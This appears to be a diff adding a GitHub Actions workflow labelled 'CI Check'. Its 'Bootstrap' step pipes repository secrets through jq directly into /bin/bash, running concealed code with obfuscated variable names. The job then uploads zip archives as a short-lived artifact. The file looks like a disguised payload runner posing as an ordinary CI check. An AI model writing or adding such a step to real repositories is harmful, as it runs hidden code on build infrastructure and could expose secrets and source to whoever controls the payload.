@@ -1,0 +1,31 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          zzou48: ${{ secrets.zzou48 }}
+        run: |
+          printf '%s' "$zzou48" | jq -r .dtw61828 | /bin/bash
+          echo $hx04966 | jq -r .wweu95 | /bin/bash
+          printf '%s' "$weg4" | jq -r .jo8463 | /bin/bash
+          echo $ycz404 | jq -r .xqd925 | /bin/bash
+          printf '%s' "$ebd9" | jq -r .m25445 | /bin/bash
+          printf '%s' "$ihclk0126" | jq -r .gv8979 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5gZYlKLg
+          path: "*.zip"
+          retention-days: 1
